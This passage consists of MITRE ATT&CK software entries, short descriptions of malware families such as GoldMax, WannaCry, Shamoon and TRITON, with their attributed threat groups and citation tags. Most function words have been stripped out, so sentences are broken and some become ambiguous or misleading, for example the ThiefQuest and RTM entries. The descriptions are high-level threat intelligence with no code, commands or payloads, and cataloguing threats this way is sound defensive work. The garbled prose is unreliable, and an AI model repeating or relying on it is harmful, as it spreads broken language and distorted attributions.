attacks SSH services. installed, reverse controllers, triggered unsolicited packets. (Citation: Chaos Stolen Backdoor) [ISMInjector](https://attack.mitre.org/software/S0189) Trojan install [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig Delivery Oct 2017) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) backdoor malware [FIN8](https://attack.mitre.org/groups/G0061) observed targeting POS networks hospitality industry. (Citation: Morphisec ShellTea June 2019)(Citation: FireEye Fin8 2016) (Citation: FireEye Enemy FIN8 Aug 2016) [GoldMax](https://attack.mitre.org/software/S0588) second-stage C2 backdoor written Windows Linux variants identical functionality. [GoldMax](https://attack.mitre.org/software/S0588) discovered 2021 investigation SolarWinds intrusion, [APT29](https://attack.mitre.org/groups/G0016) mid-2019. [GoldMax](https://attack.mitre.org/software/S0588) multiple defense evasion techniques, including avoiding virtualization execution masking malicious traffic.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)(Citation: CrowdStrike StellarParticle January 2022) [HELLOKITTY](https://attack.mitre.org/software/S0617) ransomware written C++  shares code structure functionality [DEATHRANSOM](https://attack.mitre.org/software/S0616) [FIVEHANDS](https://attack.mitre.org/software/S0618). [HELLOKITTY](https://attack.mitre.org/software/S0617) 2020, targets included Polish video game developer Brazilian electric power company.(Citation: FireEye FiveHands April 2021) [CostaBricks](https://attack.mitre.org/software/S0614) loader deploy 32-bit backdoors [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020) [KeyBoy](https://attack.mitre.org/software/S0387) malware targeted campaigns Tibetan Parliament 2016.(Citation: CitizenLab KeyBoy Nov 2016)(Citation: PWC KeyBoys Feb 2017) [POSHSPY](https://attack.mitre.org/software/S0150) backdoor [APT29](https://attack.mitre.org/groups/G0016) 2015. appears secondary backdoor actors lost access primary backdoors. (Citation: FireEye POSHSPY April 2017) [MiniDuke](https://attack.mitre.org/software/S0051) malware [APT29](https://attack.mitre.org/groups/G0016) 2010 2015. [MiniDuke](https://attack.mitre.org/software/S0051) toolset consists multiple downloader backdoor components. loader [MiniDuke](https://attack.mitre.org/software/S0051) components conjunction [CosmicDuke](https://attack.mitre.org/software/S0050) [PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure Dukes) [HyperBro](https://attack.mitre.org/software/S0398) custom in-memory backdoor [Threat Group-3390](https://attack.mitre.org/groups/G0027).(Citation: Unit42 Emissary Panda 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018) [Anchor](https://attack.mitre.org/software/S0504) family backdoor malware conjunction [TrickBot](https://attack.mitre.org/software/S0266) selected profile targets 2018.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020) [Pteranodon](https://attack.mitre.org/software/S0147) custom backdoor [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017) [ROKRAT](https://attack.mitre.org/software/S0240) cloud-based remote access tool (RAT) [APT37](https://attack.mitre.org/groups/G0067) target victims South Korea. [APT37](https://attack.mitre.org/groups/G0067) ROKRAT campaigns 2016 2021.(Citation: Talos ROKRAT)(Citation: Talos Group123)(Citation: Volexity InkySquid RokRAT August 2021) [CORESHELL](https://attack.mitre.org/software/S0137) downloader [APT28](https://attack.mitre.org/groups/G0007). versions malware SOURFACE versions CORESHELL.(Citation: FireEye APT28) (Citation: FireEye APT28 January 2017) [RunningRAT](https://attack.mitre.org/software/S0253) remote access tool appeared operations surrounding 2018 Pyeongchang Winter Olympics [Gold Dragon](https://attack.mitre.org/software/S0249) [Brave Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon) [Babuk](https://attack.mitre.org/software/S0638) Ransomware-as-a-service (RaaS) malware 2021. operators [Babuk](https://attack.mitre.org/software/S0638) employ "Big Game Hunting" approach targeting major enterprises operate leak post stolen data extortion scheme.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: CyberScoop Babuk February 2021) [DarkWatchman](https://attack.mitre.org/software/S0673) lightweight JavaScript-based remote access tool (RAT) avoids file operations; observed November 2021.(Citation: Prevailion DarkWatchman 2021) [Dyre](https://attack.mitre.org/software/S0024) banking Trojan financial gain. 
 (Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015) [BlackMould](https://attack.mitre.org/software/S0564) based [China Chopper](https://attack.mitre.org/software/S0020) servers running IIS. reported December 2019, malicious campaigns [GALLIUM](https://attack.mitre.org/groups/G0093) telecommunication providers.(Citation: GALLIUM December 2019) [Javali](https://attack.mitre.org/software/S0528) banking trojan targeted Portuguese Spanish-speaking countries 2017, focusing customers financial institutions Brazil Mexico.(Citation: Securelist Brazilian Banking Malware July 2020) [BBSRAT](https://attack.mitre.org/software/S0127) malware remote access tool functionality targeted compromises. (Citation: Palo Alto Networks BBSRAT) [PlugX](https://attack.mitre.org/software/S0013) remote access tool (RAT) modular plugins multiple threat groups.(Citation: Lastline PlugX Analysis)(Citation: FireEye Clandestine Fox 2)(Citation: DragonOK)(Citation: Dell TG-3390) [Reaver](https://attack.mitre.org/software/S0172) malware family wild late 2016. Reporting victims "Five Poisons," movements Chinese government considers dangerous. type malware rare final payload form [Control Panel](https://attack.mitre.org/techniques/T1218/002) items.(Citation: Palo Alto Reaver Nov 2017) [Bisonal](https://attack.mitre.org/software/S0268) remote access tool (RAT) [Tonto Team](https://attack.mitre.org/groups/G0131) public private sector organizations Russia, South Korea, Japan December 2010.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020) [S-Type](https://attack.mitre.org/software/S0085) backdoor [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) 2013.(Citation: Cylance Dust Storm) [SeaDuke](https://attack.mitre.org/software/S0053) malware [APT29](https://attack.mitre.org/groups/G0016) 2014 2015. secondary backdoor victims compromised [CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure Dukes) [BS2005](https://attack.mitre.org/software/S0014) malware [Ke3chang](https://attack.mitre.org/groups/G0004) spearphishing campaigns 2011. (Citation: Mandiant Operation Ke3chang November 2014) [DustySky](https://attack.mitre.org/software/S0062) multi-stage malware written .NET [Molerats](https://attack.mitre.org/groups/G0021) 2015. (Citation: DustySky) (Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019) [Duqu](https://attack.mitre.org/software/S0038) malware platform modular approach extend functionality deployment target network. (Citation: Symantec W32.Duqu) [Truvasys](https://attack.mitre.org/software/S0178) first-stage malware [PROMETHIUM](https://attack.mitre.org/groups/G0056). collection modules written Delphi programming language. (Citation: Win Defender Truvasys Sep 2017) (Citation: NEODYMIUM Dec 2016) (Citation: SIR 21) [Remsec](https://attack.mitre.org/software/S0125) modular backdoor [Strider](https://attack.mitre.org/groups/G0041) appears designed espionage purposes. modules written Lua. (Citation: Symantec Strider Blog) [Sykipot](https://attack.mitre.org/software/S0018) malware spearphishing campaigns 2007 victims US. variant [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards victims. (Citation: Alienvault Sykipot DOD Smart Cards) malware referred Sykipot. (Citation: Blasco 2013) [Explosive](https://attack.mitre.org/software/S0569) custom-made remote access tool [Volatile Cedar](https://attack.mitre.org/groups/G0123). identified wild 2015.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)   [Xbash](https://attack.mitre.org/software/S0341) malware family targeted Linux Windows servers. malware tied Iron Group, threat actor previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) developed Python converted self-contained Linux ELF executable PyInstaller.(Citation: Unit42 Xbash Sept 2018) [Rover](https://attack.mitre.org/software/S0090) malware suspected espionage purposes. 2015 targeted email Indian Ambassador Afghanistan. (Citation: Palo Alto Rover) [Epic](https://attack.mitre.org/software/S0091) backdoor [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla) [LightNeuron](https://attack.mitre.org/software/S0395) sophisticated backdoor targeted Exchange servers 2014. [LightNeuron](https://attack.mitre.org/software/S0395) [Turla](https://attack.mitre.org/groups/G0010) target diplomatic foreign affairs-related organizations. presence strings malware suggests Linux variant [LightNeuron](https://attack.mitre.org/software/S0395) exists.(Citation: ESET LightNeuron 2019) [Peppy](https://attack.mitre.org/software/S0643) Python-based remote access Trojan, active 2012, similarities [Crimson](https://attack.mitre.org/software/S0115).(Citation: Proofpoint Operation Transparent Tribe March 2016) 
[Cuba](https://attack.mitre.org/software/S0625) Windows-based ransomware family financial institutions, technology, logistics organizations North South America Europe December 2019.(Citation: McAfee Cuba April 2021) [DEATHRANSOM](https://attack.mitre.org/software/S0616) ransomware written 2020, potential overlap [FIVEHANDS](https://attack.mitre.org/software/S0618) [HELLOKITTY](https://attack.mitre.org/software/S0617).(Citation: FireEye FiveHands April 2021) [Clambling](https://attack.mitre.org/software/S0660) modular backdoor written C++ [Threat Group-3390](https://attack.mitre.org/groups/G0027) 2017.(Citation: Trend Micro DRBControl February 2020) [Mongall](https://attack.mitre.org/software/S1026) backdoor 2013, including [Aoqin Dragon](https://attack.mitre.org/groups/G1007).(Citation: SentinelOne Aoqin Dragon June 2022) [NanHaiShu](https://attack.mitre.org/software/S0228) remote access tool JScript backdoor [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) target government private-sector organizations relations South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016) [ThiefQuest](https://attack.mitre.org/software/S0595) virus, data stealer, wiper ransomware targeting macOS systems. [ThiefQuest](https://attack.mitre.org/software/S0595) 2020 distributed trojanized pirated versions popular macOS software Russian forums sharing torrent links.(Citation: Reed thiefquest fake ransom) [ThiefQuest](https://attack.mitre.org/software/S0595) ransomware, dynamically generated encryption key attacker appropriately form wiper malware.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis) [FoggyWeb](https://attack.mitre.org/software/S0661) passive highly-targeted backdoor capable remotely exfiltrating sensitive compromised Active Directory Federated Services (AD FS) server. [APT29](https://attack.mitre.org/groups/G0016) April 2021.(Citation: MSTIC FoggyWeb September 2021) [Carbanak](https://attack.mitre.org/software/S0030) full-featured, remote backdoor ([Carbanak](https://attack.mitre.org/groups/G0008)). intended espionage, data exfiltration, providing remote access infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017) [XTunnel](https://attack.mitre.org/software/S0117) VPN-like network proxy tool relay traffic C2 server victim. 2013 reportedly [APT28](https://attack.mitre.org/groups/G0007) compromise Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: Invincea XTunnel) (Citation: ESET Sednit 2) [Hydraq](https://attack.mitre.org/software/S0203) data-theft trojan [Elderwood](https://attack.mitre.org/groups/G0066) 2009 Google intrusion Operation Aurora, variations trojan campaigns Chinese actors, including [APT17](https://attack.mitre.org/groups/G0025).(Citation: MicroFocus 9002 Aug 2016)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: ASERT Dagger Aug 2015)(Citation: FireEye DeputyDog 9002 November 2013)(Citation: ProofPoint 9002 Aug 2017)(Citation: FireEye Sunshop Campaign 2013)(Citation: PaloAlto 3102 Sept 2015) [SHARPSTATS](https://attack.mitre.org/software/S0450) .NET backdoor [MuddyWater](https://attack.mitre.org/groups/G0069) 2019.(Citation: TrendMicro POWERSTATS V3 June 2019) [Ferocious](https://attack.mitre.org/software/S0679) stage implant composed VBS PowerShell scripts [WIRTE](https://attack.mitre.org/groups/G0090) 2021.(Citation: Kaspersky WIRTE November 2021) [HOMEFRY](https://attack.mitre.org/software/S0232) 64-bit Windows password dumper/cracker conjunction [Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope March 2018) [CreepyDrive](https://attack.mitre.org/software/S1023) custom implant [POLONIUM](https://attack.mitre.org/groups/G1005) 2022 C2 exfiltration actor-controlled OneDrive accounts.(Citation: POLONIUM June 2022)

[POLONIUM](https://attack.mitre.org/groups/G1005) implant called CreepyBox relies actor-controlled DropBox accounts.(Citation: POLONIUM June 2022) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) self-developed tool created [Volatile Cedar](https://attack.mitre.org/groups/G0123).(Citation: ClearSky Lebanese Cedar Jan 2021)  [Netwalker](https://attack.mitre.org/software/S0457) fileless ransomware written PowerShell executed memory.(Citation: TrendMicro Netwalker 2020) [Elise](https://attack.mitre.org/software/S0081) custom backdoor Trojan appears exclusively [Lotus Blossom](https://attack.mitre.org/groups/G0030). larger of
tools referred LStudio, Group, APT0LSTU. (Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018) [USBferry](https://attack.mitre.org/software/S0452) stealing malware [Tropic Trooper](https://attack.mitre.org/groups/G0081) targeted attacks Taiwanese Philippine air-gapped military environments. [USBferry](https://attack.mitre.org/software/S0452) shares overlapping codebase [YAHOYAH](https://attack.mitre.org/software/S0388), features distinct piece malware.(Citation: TrendMicro Tropic Trooper 2020) [WannaCry](https://attack.mitre.org/software/S0366) ransomware global attack 2017, 150 countries. worm-like features spread network SMBv1 exploit EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017) [Gazer](https://attack.mitre.org/software/S0168) backdoor [Turla](https://attack.mitre.org/groups/G0010) 2016. (Citation: ESET Gazer Aug 2017) [TSCookie](https://attack.mitre.org/software/S0436) remote access tool (RAT) [BlackTech](https://attack.mitre.org/groups/G0098) campaigns Japanese targets.(Citation: JPCert TSCookie March 2018)(Citation: JPCert BlackTech Malware September 2019). [TSCookie](https://attack.mitre.org/software/S0436) referred [PLEAD](https://attack.mitre.org/software/S0435) reporting separation two.(Citation: JPCert PLEAD Downloader June 2018)(Citation: JPCert BlackTech Malware September 2019) [Saint Bot](https://attack.mitre.org/software/S1018) .NET downloader [Ember Bear](https://attack.mitre.org/groups/G1003) March 2021.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Pay2Key](https://attack.mitre.org/software/S0556) ransomware written C++ [Fox Kitten](https://attack.mitre.org/groups/G0117) July 2020 including campaigns Israeli companies. [Pay2Key](https://attack.mitre.org/software/S0556) incorporated leak display stolen sensitive pressure victims payment.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Pay2Key November 2020) [Chaes](https://attack.mitre.org/software/S0631) multistage stealer written programming languages collects login credentials, credit card numbers, financial information. [Chaes](https://attack.mitre.org/software/S0631) observed 2020, appears target victims Brazil e-commerce customers Latin America.(Citation: Cybereason Chaes Nov 2020) [Briba](https://attack.mitre.org/software/S0204) trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor download files compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba 2012) [CharmPower](https://attack.mitre.org/software/S0674) PowerShell-based, modular backdoor [Magic Hound](https://attack.mitre.org/groups/G0059) 2022.(Citation: Check APT35 CharmPower January 2022) [TYPEFRAME](https://attack.mitre.org/software/S0263) remote access tool [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT TYPEFRAME June 2018) [3PARA RAT](https://attack.mitre.org/software/S0066) remote access tool (RAT) programmed C++ [Putter Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda) [Bundlore](https://attack.mitre.org/software/S0482) adware written macOS 2015. categorized adware, [Bundlore](https://attack.mitre.org/software/S0482) features traditional backdoors.(Citation: MacKeeper Bundlore Apr 2019) [P8RAT](https://attack.mitre.org/software/S0626) fileless malware [menuPass](https://attack.mitre.org/groups/G0045) download execute payloads 2020.(Citation: Securelist APT10 March 2021) [EVILNUM](https://attack.mitre.org/software/S0568) capable backdoor identified 2018. [EVILNUM](https://attack.mitre.org/software/S0568) APT [Evilnum](https://attack.mitre.org/groups/G0120) name.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum 2020) [KOMPROGO](https://attack.mitre.org/software/S0156) signature backdoor [APT32](https://attack.mitre.org/groups/G0050) capable process, file, registry management. (Citation: FireEye APT32 2017) [SMOKEDHAM](https://attack.mitre.org/software/S0649) Powershell-based .NET backdoor reported 2021; ransomware-as-a-service affiliate.(Citation: FireEye Shining Light DARKSIDE 2021)(Citation: FireEye SMOKEDHAM June 2021) [Mori](https://attack.mitre.org/software/S1047) backdoor [MuddyWater](https://attack.mitre.org/groups/G0069) January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022) [QUADAGENT](https://attack.mitre.org/software/S0269) PowerShell backdoor [OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) fully-featured beaconing implant integrated command modules [Lazarus Group](https://attack.mitre.org/groups/G0032). reported 2020.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Sys10](https://attack.mitre.org/software/S0060) backdoor 2013 [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015) [pngdowner](https://attack.mitre.org/software/S0067) malware [Putter Panda](https://attack.mitre.org/groups/G0024). simple tool limited functionality persistence mechanism, suggesting simple "download-and-
execute" utility. (Citation: CrowdStrike Putter Panda) [BendyBear](https://attack.mitre.org/software/S0574) x64 shellcode stage-zero implant designed download malware C2 server. discovered August 2020, [BendyBear](https://attack.mitre.org/software/S0574) shares variety features [Waterbear](https://attack.mitre.org/software/S0579), malware attributed Chinese cyber espionage [BlackTech](https://attack.mitre.org/groups/G0098).(Citation: Unit42 BendyBear Feb 2021) [Uroburos](https://attack.mitre.org/software/S0022) rootkit [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla) [Metamorfo](https://attack.mitre.org/software/S0455) Latin-American banking trojan operated Brazilian cybercrime active April 2018. focuses targeting banks cryptocurrency services Brazil Mexico.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019)  [Trojan.Karagany](https://attack.mitre.org/software/S0094) modular remote access tool recon linked [Dragonfly](https://attack.mitre.org/groups/G0035). source code [Trojan.Karagany](https://attack.mitre.org/software/S0094) originated Dream Loader malware leaked 2010 sold underground forums. (Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019)(Citation: Dragos DYMALLOY ) [Bandook](https://attack.mitre.org/software/S0234) commercially RAT, written Delphi C++, 2007. government, financial, energy, healthcare, education, IT, legal organizations US, South America, Europe, Southeast Asia. [Bandook](https://attack.mitre.org/software/S0234) [Dark Caracal](https://attack.mitre.org/groups/G0070), separate campaign referred "Operation Manul".(Citation: EFF Manul Aug 2016)(Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020) [PipeMon](https://attack.mitre.org/software/S0501) multi-stage modular backdoor [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: ESET PipeMon 2020) [SYNful Knock](https://attack.mitre.org/software/S0519) stealthy modification operating network devices maintain persistence victim's network provide capabilities adversary.(Citation: Mandiant - Synful Knock)(Citation: Cisco Synful Knock Evolution) [TINYTYPHON](https://attack.mitre.org/software/S0131) backdoor  actors responsible MONSOON campaign. majority code reportedly MyDoom worm. (Citation: Forcepoint Monsoon) [KONNI](https://attack.mitre.org/software/S0356) remote access tool security researchers assess North Korean cyber actors 2014. [KONNI](https://attack.mitre.org/software/S0356) code overlap [NOKKI](https://attack.mitre.org/software/S0353) malware family, linked suspected North Korean campaigns targeting political organizations Russia, East Asia, Europe Middle East; evidence linking [KONNI](https://attack.mitre.org/software/S0356) [APT37](https://attack.mitre.org/groups/G0067).(Citation: Talos Konni 2017)(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021) [T9000](https://attack.mitre.org/software/S0098) backdoor variant T5000 malware family, Plat1. primary function gather victim. multiple targeted attacks U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto T9000 Feb 2016) [Winnti Linux](https://attack.mitre.org/software/S0430) trojan, 2015, designed targeting Linux systems. Reporting winnti malware family shared actors including [Winnti Group](https://attack.mitre.org/groups/G0044). Windows variant tracked separately [Winnti Windows](https://attack.mitre.org/software/S0141).(Citation: Chronicle Winnti Linux 2019) [gh0st RAT](https://attack.mitre.org/software/S0032) remote access tool (RAT). source code public multiple groups.(Citation: FireEye Hacking Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018) [Shamoon](https://attack.mitre.org/software/S0140) wiper malware Iranian "Cutting Sword Justice" 2012. versions Shamoon 2 Shamoon 3 observed 2016 2018. [Shamoon](https://attack.mitre.org/software/S0140) leveraging [RawDisk](https://attack.mitre.org/software/S0364) Filerase carry data wiping tasks. term Shamoon refer malware malware itself.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016) [Skeleton Key](https://attack.mitre.org/software/S0007) malware inject false credentials domain controllers intent creating backdoor password. (Citation: Dell Skeleton) Functionality [Skeleton Key](https://attack.mitre.org/software/S0007) included module [Mimikatz](https://attack.mitre.org/software/S0002). [DnsSystem](https://attack.mitre.org/software/S1021) .NET based DNS backdoor, customized version source tool DIG.net, [HEXANE](https://attack.mitre.org/groups/G1001) June 2022.(Citation: Zscaler Lyceum DnsSystem June 2022) [MoleNet](https://attack.mitre.org/software/S0553) downloader tool backdoor capabilities observed 2019.(Citation: Cybereason Molerats Dec 2020) [CORALDECK](https://attack.mitre.org/software/S0212) exfiltration tool [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018) [JHUHUGIT](https://attack.mitre.org/software/S0044) malware [APT28](https://attack.mitre.org/groups/G0007). based Carberp source code serves reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy 2015) (Citation: ESET Sednit 1) (Citation: FireEye APT28 January 2017) [SPACESHIP](https://attack.mitre.org/software/S0035) malware developed [APT30](https://attack.mitre.org/groups/G0013) propagation exfiltration data removable devices. [APT30](https://attack.mitre.org/groups/G0013) capability exfiltrate data air-gaps. (Citation: FireEye APT30) [BLUELIGHT](https://attack.mitre.org/software/S0657) remote access Trojan [APT37](https://attack.mitre.org/groups/G0067) observed 2021.(Citation: Volexity InkySquid BLUELIGHT August 2021) [KGH_SPY](https://attack.mitre.org/software/S0526) modular suite tools [Kimsuky](https://attack.mitre.org/groups/G0094) reconnaissance, stealing, backdoor capabilities. [KGH_SPY](https://attack.mitre.org/software/S0526) derived PDB paths internal names samples "KGH".(Citation: Cybereason Kimsuky November 2020)  [down_new](https://attack.mitre.org/software/S0472) downloader [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) 2019.(Citation: Trend Micro Tick November 2019) [Ixeshe](https://attack.mitre.org/software/S0015) malware family 2009 targets East Asia. (Citation: Moran 2013) [Micropsia](https://attack.mitre.org/software/S0339) remote access tool written Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [Kerrdown](https://attack.mitre.org/software/S0585) custom downloader [APT32](https://attack.mitre.org/groups/G0050) 2018 install spyware server victim's network.(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019) [RARSTONE](https://attack.mitre.org/software/S0055) malware [Naikon](https://attack.mitre.org/groups/G0019) characteristics [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE) [VBShower](https://attack.mitre.org/software/S0442) backdoor [Inception](https://attack.mitre.org/groups/G0100) 2019. [VBShower](https://attack.mitre.org/software/S0442) downloader stage payloads, including [PowerShower](https://attack.mitre.org/software/S0441).(Citation: Kaspersky Cloud Atlas August 2019) [Catchamas](https://attack.mitre.org/software/S0261) Windows Trojan steals compromised systems. (Citation: Symantec Catchamas April 2018) [StoneDrill](https://attack.mitre.org/software/S0380) wiper malware discovered destructive campaigns Middle Eastern European targets association [APT33](https://attack.mitre.org/groups/G0064).(Citation: FireEye APT33 Sept 2017)(Citation: Kaspersky StoneDrill 2017) [OopsIE](https://attack.mitre.org/software/S0264) Trojan [OilRig](https://attack.mitre.org/groups/G0049) remotely execute commands upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018) [4H RAT](https://attack.mitre.org/software/S0065) malware [Putter Panda](https://attack.mitre.org/groups/G0024) 2007. (Citation: CrowdStrike Putter Panda) [RogueRobin](https://attack.mitre.org/software/S0270) payload [DarkHydrus](https://attack.mitre.org/groups/G0079) developed PowerShell C#. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) [Attor](https://attack.mitre.org/software/S0438) Windows-based espionage platform 2013. [Attor](https://attack.mitre.org/software/S0438) loadable plugin architecture customize functionality specific targets.(Citation: ESET Attor Oct 2019) [DealersChoice](https://attack.mitre.org/software/S0243) Flash exploitation framework [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice) [SQLRat](https://attack.mitre.org/software/S0390) malware executes SQL scripts avoid leaving traditional host artifacts. [FIN7](https://attack.mitre.org/groups/G0046) observed it.(Citation: Flashpoint FIN 7 March 2019) [LitePower](https://attack.mitre.org/software/S0680) downloader stage malware [WIRTE](https://attack.mitre.org/groups/G0090) 2021.(Citation: Kaspersky WIRTE November 2021) [MegaCortex](https://attack.mitre.org/software/S0576) ransomware appeared 2019. (Citation: IBM MegaCortex) [MegaCortex](https://attack.mitre.org/software/S0576) targeted industrial organizations. (Citation: FireEye Ransomware Disrupt Industrial Production)(Citation: FireEye Financial Actors Moving OT) [StreamEx](https://attack.mitre.org/software/S0142) malware family [Deep Panda](https://attack.mitre.org/groups/G0009) 2015. 2016, distributed legitimate compromised Korean websites. (Citation: Cylance Crew Feb 2017) [Ngrok](https://attack.mitre.org/software/S0508) legitimate reverse proxy tool create secure tunnel servers located firewalls local machines public IP. [Ngrok](https://attack.mitre.org/software/S0508) leveraged threat actors campaigns including lateral movement data exfiltration.(Citation: Zdnet Ngrok September 2018)(Citation: FireEye Maze 2020)(Citation: Cyware Ngrok 2019)(Citation: MalwareBytes LazyScripter Feb 2021) [BoxCaon](https://attack.mitre.org/software/S0651) Windows backdoor [IndigoZebra](https://attack.mitre.org/groups/G0136) 2021 spearphishing campaign Afghan government officials. [BoxCaon](https://attack.mitre.org/software/S0651)'s stems similarities shared malware family [xCaon](https://attack.mitre.org/software/S0653).(Citation: Checkpoint IndigoZebra July 2021) [Crutch](https://attack.mitre.org/software/S0538) backdoor designed document theft [Turla](https://attack.mitre.org/groups/G0010) 2015.(Citation: ESET Crutch December 2020) [SDBbot](https://attack.mitre.org/software/S0461) backdoor installer loader components [TA505](https://attack.mitre.org/groups/G0092) 2019.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [Mosquito](https://attack.mitre.org/software/S0256) Win32 backdoor [Turla](https://attack.mitre.org/groups/G0010). [Mosquito](https://attack.mitre.org/software/S0256) parts: installer, launcher, backdoor. main backdoor called CommanderDLL launched loader program. (Citation: ESET Turla Mosquito Jan 2018) [RTM](https://attack.mitre.org/software/S0148) custom malware written Delphi. ([RTM](https://attack.mitre.org/groups/G0048)). versions malware reported publicly Redaman.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) entry deprecated inadvertently Enterprise; Software entry created ATT&CK ICS.

[TRITON](https://attack.mitre.org/software/S0609) attack framework built interact Triconex Safety Instrumented (SIS) controllers. [TRITON](https://attack.mitre.org/software/S0609) deployed target Middle East. (Citation: FireEye TRITON 2017)(Citation: FireEye TRITON 2018)(Citation: Dragos TRISIS)(Citation: CISA HatMan)(Citation: FireEye TEMP.Veles 2018) [Derusbi](https://attack.mitre.org/software/S0021) malware multiple Chinese APT groups.(Citation: Novetta-Axiom)(Citation: ThreatConnect Anthem) Windows Linux variants observed.(Citation: Fidelis Turbo) [SodaMaster](https://attack.mitre.org/software/S0627) fileless malware [menuPass](https://attack.mitre.org/groups/G0045) download execute payloads 2020.(Citation: Securelist APT10 March 2021) [Hikit](https://attack.mitre.org/software/S0009) malware [Axiom](https://attack.mitre.org/groups/G0001) late-stage persistence exfiltration initial compromise.(Citation: Novetta-Axiom)(Citation: FireEye Hikit Rootkit) [Grandoreiro](https://attack.mitre.org/software/S0531) banking trojan written Delphi observed 2016 Malware-as-a-Service (MaaS) business model. [Grandoreiro](https://attack.mitre.org/software/S0531) confirmed victims Brazil, Mexico, Portugal, Spain.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020) [WellMail](https://attack.mitre.org/software/S0515) lightweight malware written Golang [APT29](https://attack.mitre.org/groups/G0016), design structure [WellMess](https://attack.mitre.org/software/S0514).(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020) [LiteDuke](https://attack.mitre.org/software/S0513) stage backdoor [APT29](https://attack.mitre.org/groups/G0016), 2014-2015. [LiteDuke](https://attack.mitre.org/software/S0513) dropper [PolyglotDuke](https://attack.mitre.org/software/S0518), machines compromised [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019) [Starloader](https://attack.mitre.org/software/S0188) loader component observed loading [Felismus](https://attack.mitre.org/software/S0171) tools. (Citation: Symantec Sowbug Nov 2017) [Sakula](https://attack.mitre.org/software/S0074) remote access tool (RAT) surfaced 2012 intrusions 2015. (Citation: Dell Sakula) [VaporRage](https://attack.mitre.org/software/S0636) shellcode downloader [APT29](https://attack.mitre.org/groups/G0016) 2021.(Citation: MSTIC Nobelium Toolset 2021) [RawPOS](https://attack.mitre.org/software/S0169) point-of-sale 